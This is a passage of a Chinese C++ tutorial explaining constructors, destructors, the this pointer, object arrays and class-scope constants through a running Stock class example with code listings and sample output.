类将数据（成员变量）和操作数据的函数（成员函数）捆绑在一起。 访问说明符（public, private, protected）控制对类成员的访问。 数据隐藏（通常将数据设为 private）是封装的关键，保护数据并隐藏实现细节。 公共接口（public 成员函数）定义了如何与类的对象交互。 成员函数通常在类外部使用作用域解析运算符 :: 来定义。 使用点号 . 访问对象的公有成员。 将接口和实现分离（头文件/源文件）可以提高代码的模块化和可维护性。 10.3 类的构造函数和析构函数在上一节中，我们定义了一个 Stock 类，并通过 acquire() 成员函数来设置其初始状态。然而，C++ 提供了一种更自动化、更专门化的方式来处理对象的初始化和清理工作：构造函数 (Constructor) 和 **析构函数 (Destructor)**。 10.3.1 声明和定义构造函数构造函数是一种特殊的成员函数，它的主要目的是在创建类的对象时初始化该对象的数据成员。 特点与规则: 名称与类名相同: 构造函数的名称必须与它所属的类的名称完全一样。 没有返回类型: 构造函数没有声明返回类型，连 void 也没有。 自动调用: 当创建类的对象时，程序会自动调用相应的构造函数。 可以重载: 一个类可以有多个构造函数，只要它们的参数列表不同（参数个数、类型或顺序不同）。这允许以不同的方式初始化对象。 声明语法 (在类定义内): 12345678class ClassName &#123;public: // 构造函数声明 (无参数) ClassName(); // 构造函数声明 (带参数) ClassName(ParameterList); // ... 其他成员 ...&#125;; 定义语法 (在类外部): 123456789// 无参数构造函数定义ClassName::ClassName() &#123; // 初始化代码&#125;// 带参数构造函数定义ClassName::ClassName(ParameterList) &#123; // 使用参数进行初始化&#125; 示例：为 Stock 类添加构造函数 我们可以为 Stock 类添加构造函数来替代之前的 acquire() 函数的部分功能，确保对象在创建时就被赋予有意义的初始值。 123456789101112131415161718192021// 在 stock.h 的类定义中声明class Stock &#123;private: std::string company; long shares; double share_val; double total_val; void set_tot() &#123; total_val = shares * share_val; &#125;public: // 构造函数声明 (两个版本) Stock(); // 默认构造函数 (无参数) Stock(const std::string &amp;co, long n = 0, double pr = 0.0); // 带参数的构造函数 (使用默认参数) // 不再需要 acquire()，因为构造函数处理了初始设置 // void acquire(const std::string &amp;co, long n, double pr); void buy(long num, double price); void sell(long num, double price); void update(double price); void show() const;&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// 在 stock.cpp 中定义构造函数#include &lt;iostream&gt;#include &quot;stock.h&quot;// 默认构造函数定义Stock::Stock() &#123; // 默认构造函数 std::cout &lt;&lt; &quot;Default constructor called\\n&quot;; // 只是为了演示 company = &quot;no name&quot;; shares = 0; share_val = 0.0; total_val = 0.0;&#125;// 带参数的构造函数定义Stock::Stock(const std::string &amp;co, long n, double pr) &#123; std::cout &lt;&lt; &quot;Constructor using &quot; &lt;&lt; co &lt;&lt; &quot; called\\n&quot;; // 只是为了演示 company = co; if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares can&#x27;t be negative; &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot();&#125;// ... buy(), sell(), update(), show() 的定义保持不变 ...// (注意：buy, sell, update 内部的 set_tot() 调用仍然需要)void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cout &lt;&lt; &quot;You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;void Stock::show() const &#123; std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125; 10.3.2 使用构造函数当创建对象时，编译器会自动选择匹配的构造函数来执行。 1234567891011121314151617181920212223242526272829303132#include &quot;stock.h&quot; // 包含 Stock 类定义int main() &#123; // 调用带参数的构造函数 Stock(const std::string &amp;co, long n, double pr) Stock stock1(&quot;NanoSmart&quot;, 12, 20.0); // 显式提供所有参数 stock1.show(); // 调用带参数的构造函数，利用了 n 和 pr 的默认值 (n=0, pr=0.0) Stock stock2(&quot;Boffo Objects&quot;); // 等同于 Stock(&quot;Boffo Objects&quot;, 0, 0.0) stock2.show(); // 调用默认构造函数 Stock() Stock stock3; // 注意：这里不能写 stock3() stock3.show(); // 也可以使用 C++11 的列表初始化 Stock stock4 = &#123;&quot;Fleep Enterprises&quot;, 100, 1.25&#125;; // 调用带参数构造函数 stock4.show(); Stock stock5&#123;&quot;Dummy Corp&quot;&#125;; // 调用带参数构造函数 (利用默认值) stock5.show(); Stock stock6&#123;&#125;; // 调用默认构造函数 Stock() stock6.show(); // 动态分配对象时也会调用构造函数 Stock *p_stock = new Stock(&quot;Electroshock Games&quot;, 18, 19.0); p_stock-&gt;show(); delete p_stock; // 稍后会看到 delete 会调用析构函数 return 0;&#125; 输出可能包含 (取决于编译器和优化): 123456789101112131415161718192021Constructor using NanoSmart calledCompany: NanoSmart Shares: 12 Share Price: $20.000 Total Worth: $240.00Constructor using Boffo Objects calledCompany: Boffo Objects Shares: 0 Share Price: $0.000 Total Worth: $0.00Default constructor calledCompany: no name Shares: 0 Share Price: $0.000 Total Worth: $0.00Constructor using Fleep Enterprises calledCompany: Fleep Enterprises Shares: 100 Share Price: $1.250 Total Worth: $125.00Constructor using Dummy Corp calledCompany: Dummy Corp Shares: 0 Share Price: $0.000 Total Worth: $0.00Default constructor calledCompany: no name Shares: 0 Share Price: $0.000 Total Worth: $0.00Constructor using Electroshock Games calledCompany: Electroshock Games Shares: 18 Share Price: $19.000 Total Worth: $342.00 10.3.3 默认构造函数默认构造函数 (Default Constructor) 是指不接受任何参数的构造函数。 编译器生成的默认构造函数: 如果你没有为类定义任何构造函数，编译器会自动为你生成一个默认构造函数。这个合成的构造函数什么也不做（对于内置类型成员不会初始化，对于类类型成员会调用其默认构造函数）。 用户定义的默认构造函数: 如果你定义了一个无参数的构造函数（如上面 Stock::Stock()），那么它就是默认构造函数。 重要规则: 如果你为类定义了任何构造函数（即使是带参数的），编译器就不会再自动生成默认构造函数了。如果你还需要一个无参数的构造函数（例如，为了能创建 Stock stock3; 这样的对象），你就必须显式地定义它。 在我们的 Stock 示例中，因为我们定义了 Stock(const std::string &amp;co, ...)，编译器就不会自动生成默认构造函数。因此，我们必须自己提供 Stock::Stock()，否则 Stock stock3; 这样的声明将导致编译错误。 C++11 = default: 如果你定义了其他构造函数，但仍希望编译器为你生成默认的、行为简单的默认构造函数，可以使用 = default。 1234567class Example &#123;public: Example(int v) : value(v) &#123;&#125; // 用户定义的带参构造函数 Example() = default; // 显式要求编译器生成默认构造函数private: int value;&#125;; 10.3.4 析构函数析构函数 (Destructor) 是另一种特殊的成员函数，它的主要目的是在对象生命周期结束时执行清理工作。 用途: 释放对象在生命周期内分配的资源（例如，通过 new 分配的内存）。 执行任何必要的关闭操作（例如，关闭文件、断开网络连接）。 特点与规则: 名称: 析构函数的名称是在类名前加上波浪号 ~（例如 ~Stock）。 没有返回类型: 和构造函数一样，析构函数也没有返回类型，连 void 也没有。 没有参数: 析构函数不能接受任何参数，因此不能被重载。一个类最多只有一个析构函数。 自动调用: 当对象被销毁时，析构函数会自动被调用。这发生在： 对象的作用域结束时（对于自动存储对象，如函数内的局部对象）。 当对指向对象的指针调用 delete 时（对于动态存储对象）。 当包含该对象的对象被销毁时。 声明语法 (在类定义内): 123456class ClassName &#123;public: // ... 构造函数和其他成员 ... // 析构函数声明 ~ClassName();&#125;; 定义语法 (在类外部): 123ClassName::~ClassName() &#123; // 清理代码&#125; 示例：为 Stock 类添加析构函数 对于我们当前的 Stock 类，它并没有在内部使用 new 分配内存，所以析构函数不是严格必需的。但为了演示，我们可以添加一个简单的析构函数。 12345678910// 在 stock.h 的类定义中声明class Stock &#123; // ... private members ...public: // ... constructors ... // ... other public methods ... // 析构函数声明 ~Stock();&#125;; 12345678910111213// 在 stock.cpp 中定义析构函数#include &lt;iostream&gt;#include &quot;stock.h&quot;// ... constructor definitions ...// ... other method definitions ...// 析构函数定义Stock::~Stock() &#123; // 对于这个简单的 Stock 类，没什么需要显式清理的 // 但我们可以加一条打印语句来观察它何时被调用 std::cout &lt;&lt; &quot;Bye, &quot; &lt;&lt; company &lt;&lt; &quot;!\\n&quot;;&#125; 观察析构函数的调用: 123456789101112131415161718192021#include &lt;iostream&gt;#include &quot;stock.h&quot;int main() &#123; &#123; // 创建一个内部作用域 std::cout &lt;&lt; &quot;--- Entering inner block ---\\n&quot;; Stock stock1(&quot;Smart Comp&quot;, 50, 5.0); Stock stock2(&quot;Great Gadgets&quot;, 10, 12.0); std::cout &lt;&lt; &quot;--- Exiting inner block ---\\n&quot;; // 当离开这个作用域时，stock2 和 stock1 (按相反顺序创建) 会被销毁 &#125; // stock2 的析构函数先调用，然后是 stock1 的 std::cout &lt;&lt; &quot;--- Creating dynamic stock ---\\n&quot;; Stock *p_stock = new Stock(&quot;Dynamic Duo&quot;, 25, 2.5); p_stock-&gt;show(); std::cout &lt;&lt; &quot;--- Deleting dynamic stock ---\\n&quot;; delete p_stock; // 调用析构函数，然后释放内存 std::cout &lt;&lt; &quot;--- main() is ending ---\\n&quot;; return 0;&#125; 可能的输出: 12345678910111213--- Entering inner block ---Constructor using Smart Comp calledConstructor using Great Gadgets called--- Exiting inner block ---Bye, Great Gadgets!Bye, Smart Comp!--- Creating dynamic stock ---Constructor using Dynamic Duo calledCompany: Dynamic Duo Shares: 25 Share Price: $2.500 Total Worth: $62.50--- Deleting dynamic stock ---Bye, Dynamic Duo!--- main() is ending --- 注意析构函数调用的时机和顺序（对于局部对象，与构造顺序相反）。 10.3.5 改进 Stock 类现在，我们可以整合构造函数和析构函数，得到一个更完善（虽然在这个例子中析构函数作用不大）的 Stock 类。 stock.h (最终版本) 1234567891011121314151617181920212223242526272829// filepath: d:\\ProgramData\\files_Cpp\\250424\\stock.h#ifndef STOCK_H_#define STOCK_H_#include &lt;string&gt;class Stock &#123;private: std::string company; long shares; double share_val; double total_val; void set_tot() &#123; total_val = shares * share_val; &#125;public: // 构造函数 Stock(); // 默认构造函数 Stock(const std::string &amp;co, long n = 0, double pr = 0.0); // 析构函数 ~Stock(); // 其他成员函数 void buy(long num, double price); void sell(long num, double price); void update(double price); void show() const;&#125;;#endif // STOCK_H_ stock.cpp (最终版本) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// filepath: d:\\ProgramData\\files_Cpp\\250424\\stock.cpp#include &lt;iostream&gt;#include &quot;stock.h&quot;// 构造函数定义Stock::Stock() &#123; company = &quot;no name&quot;; shares = 0; share_val = 0.0; total_val = 0.0;&#125;Stock::Stock(const std::string &amp;co, long n, double pr) &#123; company = co; if (n &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares can&#x27;t be negative. &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; // 使用 cerr 输出错误 shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot();&#125;// 析构函数定义Stock::~Stock() &#123; // 在这个简单类中，析构函数体可以为空 // std::cout &lt;&lt; &quot;Destructor called for &quot; &lt;&lt; company &lt;&lt; &quot;\\n&quot;; // 可以取消注释来观察&#125;// 其他成员函数定义void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cerr &lt;&lt; &quot;Error: You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;void Stock::show() const &#123; // 使用 iomanip 来设置格式可能更清晰 std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125; 10.3.6 构造函数和析构函数小结 构造函数: 与类同名，无返回类型。 在创建对象时自动调用，用于初始化对象。 可以重载（提供不同的参数列表）。 如果没有定义任何构造函数，编译器会生成一个默认构造函数（无参数，什么也不做）。 如果定义了任何构造函数，编译器不再生成默认构造函数；如果需要无参数构造，必须自己定义。 析构函数: 类名前加 ~，无返回类型，无参数。 在对象销毁时自动调用，用于清理资源。 不能重载，一个类只有一个析构函数。 如果类中使用了 new 分配资源，通常需要在析构函数中使用 delete 来释放。 构造函数和析构函数是 C++ 类机制的重要组成部分，它们确保了对象的正确初始化和资源的安全释放，是实现资源获取即初始化 (RAII - Resource Acquisition Is Initialization) 这一重要 C++ 编程范式的基石。 10.4 this 指针在 C++ 类的成员函数内部，你有时可能需要引用调用该函数的对象本身。例如，当你在 stock1.show() 的实现代码中，如何明确地指代 stock1 这个对象？C++ 为此提供了一个特殊的指针，称为 this 指针。 this 指针是什么？this 是一个隐含的指针，它存在于每个非静态成员函数（non-static member function）内部。它指向调用该成员函数的那个对象。 当你调用 stock1.show() 时，在 show() 函数的内部，this 指针就指向 stock1 对象。 当你调用 stock2.buy(..) 时，在 buy() 函数的内部，this 指针就指向 stock2 对象。 编译器在调用成员函数时，会隐式地将对象的地址传递给该函数，这个地址就被 this 指针所持有。 关键点： 隐含参数: this 指针是作为隐含参数传递给非静态成员函数的。你不需要在函数参数列表中显式声明它。 指向调用对象: 它总是指向当前正在执行其成员函数的那个对象。 类型: this 指针的类型是 ClassName * const（对于非 const 成员函数）或 const ClassName * const（对于 const 成员函数）。这意味着 this 指针本身是一个常量指针（不能让它指向其他对象），并且对于 const 成员函数，它指向一个 const 对象（不能通过 this 修改对象的数据成员）。 访问成员: 在成员函数内部，当你直接访问数据成员（如 shares）或调用其他成员函数（如 set_tot()）时，实际上是编译器隐式地使用了 this 指针，等同于 this-&gt;shares 或 this-&gt;set_tot()。 使用 this 指针大多数情况下，你不需要显式地使用 this 指针，因为编译器会自动处理。例如，在 Stock::buy 函数中： 1234567891011121314void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; // ... &#125; else &#123; // shares += num; // 隐式使用 this-&gt;shares // share_val = price; // 隐式使用 this-&gt;share_val // set_tot(); // 隐式调用 this-&gt;set_tot() // 下面是显式使用 this 的等效写法： this-&gt;shares += num; this-&gt;share_val = price; this-&gt;set_tot(); &#125;&#125; 然而，在某些特定场景下，显式使用 this 指针是必要的或有用的： 区分同名参数和成员: 当成员函数的参数名与数据成员名相同时，需要使用 this-&gt; 来明确指定访问的是数据成员。 1234567891011121314151617class Example &#123;private: int value;public: // 参数名 value 与数据成员 value 相同 Example(int value) &#123; // 必须使用 this-&gt;value 来引用数据成员 this-&gt;value = value; &#125; void print() const &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; &#125; // 这里访问的是成员 value&#125;;int main() &#123; Example ex(10); // 调用构造函数 ex.print(); // 输出 10 return 0;&#125; (虽然这种命名方式有时会用到，但一些编码规范建议避免参数名和成员名完全相同，例如使用 m_value 或 value_ 作为成员名) 返回对象自身的引用或指针: 当成员函数需要返回调用该函数的对象本身时（通常是为了支持**方法链式调用 (Method Chaining)**）。 12345678910111213141516171819202122232425262728293031class Counter &#123;private: int count = 0;public: Counter&amp; increment() &#123; // 返回类型是 Counter&amp; count++; return *this; // 返回调用对象自身的引用 &#125; Counter&amp; add(int val) &#123; // 返回类型是 Counter&amp; count += val; return *this; // 返回调用对象自身的引用 &#125; void display() const &#123; std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; count &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Counter c; c.display(); // Output: Count: 0 // 方法链式调用 c.increment().add(5).increment(); // 先调用 increment(), 返回 c 的引用； // 再对 c 调用 add(5), 返回 c 的引用； // 最后对 c 调用 increment() c.display(); // Output: Count: 7 return 0;&#125; 在 increment() 和 add() 中，return *this; 返回的是调用对象（c）的引用，使得可以在其后继续调用该对象的其他成员函数。 在友元函数或独立函数中传递对象: 虽然 this 本身只在成员函数内可用，但你可以将 *this（对象本身）或 this（对象地址）传递给需要操作该对象的其他函数。 this 与 Stock 类让我们看看 this 如何应用于之前的 Stock 类。假设我们想添加一个方法，用于比较两个 Stock 对象的总价值，并返回总价值较高的那个对象的引用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 在 stock.h 的类定义中添加声明class Stock &#123; // ... private members ...public: // ... constructors, destructor, buy, sell, update, show ... // 新增方法：比较总价值，返回价值更高的对象的引用 // 第一个const（返回值前）：表示返回的引用是常量，不能被修改 // 第二个const（参数中） ：表示参数是常量引用，函数内不能修改参数 // 第三个const（函数末尾）：表示这是一个常量成员函数，不能修改调用对象的成员变量 const Stock&amp; topval(const Stock&amp; s) const;&#125;;// 在 stock.cpp 中添加定义#include &quot;stock.h&quot;// ... 其他定义 ...// 定义 topval 方法const Stock&amp; Stock::topval(const Stock&amp; s) const &#123; // this-&gt;total_val 是调用该方法的对象 (e.g., stock1) 的总价值 // s.total_val 是传入的参数对象 (e.g., stock2) 的总价值 if (s.total_val &gt; this-&gt;total_val) &#123; return s; // 返回传入的对象 s &#125; else &#123; return *this; // 返回调用该方法的对象自身 (*this) &#125; // 注意：函数声明和定义末尾的 const 表示此函数不会修改任何 Stock 对象， // 因此 this 的类型是 const Stock* const，*this 的类型是 const Stock&amp;&#125;// 使用示例#include &lt;iostream&gt;#include &quot;stock.h&quot;int main() &#123; Stock stock1(&quot;Company A&quot;, 100, 10.0); // total_val = 1000.0 Stock stock2(&quot;Company B&quot;, 50, 25.0); // total_val = 1250.0 stock1.show(); stock2.show(); const Stock&amp; top = stock1.topval(stock2); // 调用 stock1.topval，传入 stock2 // 内部比较 s(stock2).total_val 和 this(stock1)-&gt;total_val // 因为 stock2 价值更高，返回 stock2 的引用 std::cout &lt;&lt; &quot;\\nTop value stock:\\n&quot;; top.show(); // 显示的是 stock2 的信息 return 0;&#125; 在这个例子中，this-&gt;total_val 明确表示访问的是调用 topval 函数的那个对象（stock1）的 total_val 成员，而 s.total_val 访问的是作为参数传递进来的对象（stock2）的 total_val。return *this; 则返回了调用对象 stock1 本身的引用。 总结 this 是一个指向调用对象的指针，在非静态成员函数内部可用。 它使得成员函数能够访问和操作调用它的那个特定对象的数据成员和成员函数。 大多数情况下，this 的使用是隐式的。 显式使用 this 主要用于： 区分同名的参数和数据成员。 从成员函数中返回调用对象自身的引用或指针（常用于方法链）。 this 指针的类型取决于成员函数是否为 const。 10.5 对象数组就像可以创建 int、double 或 char 的数组一样，你也可以创建类对象的数组。数组的每个元素都是一个该类的对象。 声明对象数组声明对象数组的语法与声明基本类型数组类似： 1ClassName arrayName[numberOfElements]; 例如，要创建一个包含 4 个 Stock 对象的数组： 1234#include &quot;stock.h&quot; // 假设 Stock 类定义在此const int STKS = 4;Stock myStocks[STKS]; // 创建一个包含 4 个 Stock 对象的数组 构造函数的调用当程序创建对象数组时，它需要为数组中的每个元素（对象）调用构造函数。 默认构造函数: 如果在声明数组时没有为元素提供显式的初始化值，程序将为数组中的每个元素调用类的**默认构造函数 (Default Constructor)**。 在上面的例子 Stock myStocks[STKS]; 中，Stock::Stock() 这个默认构造函数将被调用 4 次，为 myStocks[0], myStocks[1], myStocks[2], myStocks[3] 这四个对象进行初始化。 重要: 如果类没有默认构造函数（例如，你只定义了带参数的构造函数，而没有定义无参数的构造函数或使用 = default），那么尝试创建像 Stock myStocks[STKS]; 这样的未初始化数组将导致编译错误。 带参数的构造函数: 你可以在声明数组时使用初始化列表来为数组元素指定不同的构造函数调用。 1234567891011121314#include &quot;stock.h&quot;const int STKS = 2;Stock portfolio[STKS] = &#123; Stock(&quot;NanoSmart&quot;, 12, 20.0), // 调用 Stock(const string&amp;, long, double) Stock(&quot;Boffo Objects&quot;, 200, 2.0) // 调用 Stock(const string&amp;, long, double)&#125;;// C++11 及以后版本可以使用更简洁的列表初始化Stock investments[] = &#123; // 编译器会自动计算数组大小 (3) Stock(&quot;Fleep Co&quot;, 5, 15.5), Stock(), // 调用默认构造函数 Stock() Stock(&quot;MacroHard&quot;, 18, 75.0)&#125;; 在 portfolio 数组的例子中，portfolio[0] 使用提供的参数调用 Stock(const string&amp;, long, double) 构造函数，portfolio[1] 也一样。 在 investments 数组的例子中，investments[0] 和 investments[2] 调用带参数的构造函数，而 investments[1] 则显式调用了默认构造函数 Stock()。 如果初始化列表提供的初始值数量少于数组大小，则剩余的元素将使用默认构造函数进行初始化。如果类没有默认构造函数，这将导致编译错误。 12345Stock funds[4] = &#123; Stock(&quot;A Corp&quot;, 10, 1.0), Stock(&quot;B Ltd&quot;, 20, 2.0) // funds[2] 和 funds[3] 将使用默认构造函数 Stock() 初始化&#125;; 访问对象数组成员访问数组中对象的成员与访问基本类型数组元素类似，先用索引 [] 选择数组中的特定对象，然后使用点号 . 访问该对象的公有成员（数据或函数）。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &quot;stock.h&quot;const int STKS = 4;int main() &#123; // 使用初始化列表创建并初始化数组 Stock stocks[STKS] = &#123; Stock(&quot;NanoSmart&quot;, 12, 20.0), Stock(&quot;Boffo Objects&quot;, 200, 2.0), Stock(&quot;Monolithic Obelisks&quot;, 130, 3.25), Stock(&quot;Fleep Enterprises&quot;, 60, 6.5) &#125;; std::cout &lt;&lt; &quot;Stock holdings:\\n&quot;; int st; for (st = 0; st &lt; STKS; st++) &#123; stocks[st].show(); // 调用数组中第 st 个对象的 show() 方法 &#125; // 找到价值最高的股票 (使用上一节的 topval 假设它已添加) // 注意：topval 需要添加到 Stock 类中才能编译 /* const Stock* top = &amp;stocks[0]; // 假设第一个是最高的 for (st = 1; st &lt; STKS; st++) &#123; top = &amp;top-&gt;topval(stocks[st]); // 比较并更新 top 指针 &#125; std::cout &lt;&lt; &quot;\\nMost valuable holding:\\n&quot;; top-&gt;show(); // 显示价值最高的股票信息 */ // 修改数组中某个对象的状态 std::cout &lt;&lt; &quot;\\nBuying more Boffo Objects...\\n&quot;; stocks[1].buy(50, 2.5); // 调用 stocks[1] 对象的 buy() 方法 stocks[1].show(); return 0;&#125; 输出示例 (假设 topval 部分被注释掉): 123456789101112131415161718192021Constructor using NanoSmart calledConstructor using Boffo Objects calledConstructor using Monolithic Obelisks calledConstructor using Fleep Enterprises calledStock holdings:Company: NanoSmart Shares: 12 Share Price: $20.000 Total Worth: $240.00Company: Boffo Objects Shares: 200 Share Price: $2.000 Total Worth: $400.00Company: Monolithic Obelisks Shares: 130 Share Price: $3.250 Total Worth: $422.50Company: Fleep Enterprises Shares: 60 Share Price: $6.500 Total Worth: $390.00Buying more Boffo Objects...Company: Boffo Objects Shares: 250 Share Price: $2.500 Total Worth: $625.00Bye, Fleep Enterprises!Bye, Monolithic Obelisks!Bye, Boffo Objects!Bye, NanoSmart! 注意：程序结束时，数组 stocks 中的每个对象的析构函数都会被调用（按与构造相反的顺序）。 动态对象数组你也可以使用 new 来创建动态的对象数组。 12int size = 5;Stock *portfolio = new Stock[size]; // 创建包含 5 个 Stock 对象的动态数组 默认构造函数要求: 使用 new ClassName[size] 这种形式时，必须要求类具有可访问的默认构造函数，因为它会为数组中的每个元素调用默认构造函数。 C++11 列表初始化 (可选): C++11 允许在使用 new 创建数组时提供初始化列表，这样可以调用特定的构造函数，并且如果提供了所有元素的初始化值，则不强制要求默认构造函数。 1234567891011// C++11 or laterStock *p_list = new Stock[3] &#123; Stock(&quot;X Inc&quot;, 1, 1.0), Stock(&quot;Y Ltd&quot;, 2, 2.0), Stock(&quot;Z LLC&quot;, 3, 3.0)&#125;;Stock *p_partial = new Stock[4] &#123; Stock(&quot;A&quot;, 1, 1.0), Stock(&quot;B&quot;, 2, 2.0) // p_partial[2] 和 p_partial[3] 需要默认构造函数&#125;; 访问: 访问动态数组成员可以使用数组表示法 portfolio[i].member 或指针表示法 (portfolio + i)-&gt;member。 释放内存: 必须使用 delete [] 来释放动态分配的对象数组，以确保每个对象的析构函数都被正确调用。 123delete [] portfolio; // 调用 5 次析构函数，然后释放内存delete [] p_list;delete [] p_partial; 错误: 使用 delete portfolio; 只会调用第一个元素的析构函数，并可能导致内存泄漏或未定义行为。 总结 可以像创建基本类型数组一样创建对象数组。 创建对象数组时，会为每个元素调用构造函数。 如果未提供显式初始化，则调用默认构造函数。因此，对于未初始化的数组或使用 new ClassName[size] 创建的动态数组，类必须有可访问的默认构造函数。 可以使用初始化列表为数组成员指定不同的构造函数。 通过 arrayName[index].member 的方式访问数组成员。 动态对象数组使用 new ClassName[size] 创建，并必须使用 delete [] arrayPtr 释放。 10.6 类作用域我们已经知道，在函数内部或代码块内部定义的变量具有局部作用域（块作用域）。类似地，在类中定义的名称（数据成员、成员函数、嵌套类型、枚举等）也有其特定的作用域，称为**类作用域 (Class Scope)**。 类作用域的规则: 内部可见性: 在类声明或成员函数定义内部，可以直接访问类的成员（数据成员、成员函数、枚举等），无需特殊限定。 外部访问限制: 在类的外部，不能直接访问类的成员。必须通过对象（使用点号 . 或箭头 -&gt;）或者通过类名和作用域解析运算符 ::（对于静态成员、嵌套类型或枚举）来访问。 名称隔离: 类作用域意味着在一个类内部定义的名称不会与在另一个类或全局作用域中定义的同名名称冲突。例如，两个不同的类可以都有一个名为 count 的数据成员。 示例: 12345678910111213141516171819202122232425262728293031class ClassA &#123;public: int count; // ClassA 的 count void process() &#123; value = 10; &#125; // 可以直接访问 valueprivate: int value; // ClassA 的 value&#125;;class ClassB &#123;public: double count; // ClassB 的 count (与 ClassA::count 不冲突) void calculate() &#123; /* ... */ &#125;&#125;;int global_count = 100; // 全局变量int main() &#123; ClassA objA; ClassB objB; objA.count = 1; // 访问 ClassA 对象的 count 成员 objB.count = 2.5; // 访问 ClassB 对象的 count 成员 // 错误！不能直接访问类内部的名称 // count = 5; // 访问哪个 count？ // value = 20; // 错误！value 在类作用域内 objA.process(); // 通过对象调用成员函数 return 0;&#125; 作用域解析运算符 :: 当我们需要在类外部引用类作用域内的名称时（例如，在定义成员函数或访问静态成员时），就需要使用类名和作用域解析运算符 ::。 12345// 在类外部定义成员函数void ClassA::process() &#123; // 使用 ClassA:: 指明 process 属于 ClassA value = 10; // 在成员函数内部，可以直接访问其他成员 this-&gt;count = 5; // 也可以显式使用 this&#125; 10.6.1 作用域为类的常量有时，我们希望在类中定义一个常量，这个常量对于该类的所有对象来说都是一样的，并且可能在编译时就需要知道它的值（例如，用于指定数组大小）。 有几种方法可以在类作用域内创建常量： static const 成员 (整型或枚举类型 - C++11 前常用): 对于整型（int, char, bool 等）或枚举类型的常量，可以在类定义内部使用 static const 直接初始化。static 意味着这个常量属于类本身，而不是任何特定对象（所有对象共享同一个常量），const 意味着它的值不能被修改。 12345678910111213class Bakery &#123;private: // 这个常量属于类，所有对象共享 static const int Months = 12; // 声明并初始化静态常量成员 double costs[Months];public: // ...&#125;;// 注意：如果需要在类外部获取该常量的地址，// 或者编译器要求（较旧的编译器可能需要），// 可能还需要在源文件中提供一个定义（不带初始值）：// const int Bakery::Months; // 可选的定义 这种方式不能用于初始化非整型或非枚举类型的静态常量。 static constexpr 成员 (C++11 及以后): C++11 引入了 constexpr，它允许在编译时计算常量表达式。使用 static constexpr 可以定义各种类型的类作用域常量，只要初始化表达式是常量表达式即可。这是现代 C++ 中定义类常量的推荐方式。 1234567891011121314class Config &#123;public: static constexpr int MaxUsers = 100; static constexpr double Rate = 1.5; static constexpr const char* DefaultMsg = &quot;Welcome&quot;; // ...&#125;;int main() &#123; int userLimit = Config::MaxUsers; // 直接使用类名访问 double currentRate = Config::Rate; // ... return 0;&#125; static constexpr 成员默认是内联的，通常不需要在类外部再次定义。 枚举技巧 (Enum Hack - C++11 前的变通方法): 在 C++11 之前，如果想在类中定义一个非整型的常量（或者只是想避免 static const 可能需要的外部定义），有时会使用匿名枚举。 1234567class LegacyBox &#123;private: enum &#123; MaxSize = 100 &#125;; // 枚举技巧 int items[MaxSize]; // 使用枚举量作为数组大小public: // ...&#125;; MaxSize 就像一个值为 100 的整型常量，但它是一个枚举量。这种方法现在已不常用，static constexpr 是更好的选择。 10.6.2 作用域内枚举 (Scoped Enumerations - C++11)传统的 C++ 枚举（enum）存在一些问题： 名称冲突: 